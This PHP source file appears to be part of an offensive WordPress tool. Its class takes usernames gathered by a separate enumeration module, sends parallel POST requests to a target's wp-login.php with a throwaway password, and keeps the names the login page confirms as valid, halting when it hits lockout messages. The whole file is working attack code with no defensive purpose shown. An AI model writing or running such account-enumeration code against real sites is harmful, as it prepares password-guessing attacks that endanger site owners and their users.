<?php
include 'init.php';
class Chkuser
{
    
    private $rc;
    private $names;
    function __construct() {
        $this->rc = new RollingCurl();
        $this->rc->callback = $this->create_request_callback($this->rc);
        $this->rc->__set('window_size', Thread);
        $this->rc->__set('time_out', TimeOut);
    }
    
    function create_request_callback($rc) {
        return function ($response, $info, $request) use ($rc) {
            if ($info['http_code'] == 404 || $info['http_code'] == 403 || $info['http_code'] == 500) {
                echo '[-] Access error!' . PHP_EOL;
                $this->rc->cancelRequests();
            }
            preg_match('#log=(.+)&pwd=#', $request->post_data, $out);
            $user = $out[1];
            
            if (stristr($response, "<strong>" . $user . "</strong>")) {
                $this->names[] = $user;
            }
            if (stristr($response, 'Too many failed login attempts')) {
                $this->rc->cancelRequests();
            }
        };
    }
    
    function run() {
        include_once 'enum_user.php';
        $collector = new EnumUser();
        $collector->run();
        $users = $collector->result();
        printf("[+] %s Chkusers Loginname...\r\n", date('h:i:s', time()));
        foreach ($users as $user) {
            $url = domain . '/wp-login.php';
            $post_data = "log={$user}&pwd=UjP8XnFD4n3LzIjlax";
            $request = new RollingCurlRequest($url, 'POST', $post_data);
            $request->options = array(CURLOPT_USERAGENT => USERAGENT);
            $this->rc->add($request);
        }
        $this->rc->execute();
        $counts = count($this->names);
        if ($counts == 0) {
            echo '[-] Warning Unable Check Loginuser!' . PHP_EOL;
            $this->names = $users;
            $counts = count($this->names);
        }
        echo 'login users:' . PHP_EOL;
        foreach ($this->names as $key => $u) {
            
            echo "\t" .iconv("UTF-8","GB18030//IGNORE",$u) . PHP_EOL;
        }
        printf("[+] %s Finded %d loginnames ... \r\n", date('h:i:s', time()), $counts);
    }
    
    function result() {
        
        return $this->names;
    }
}
?>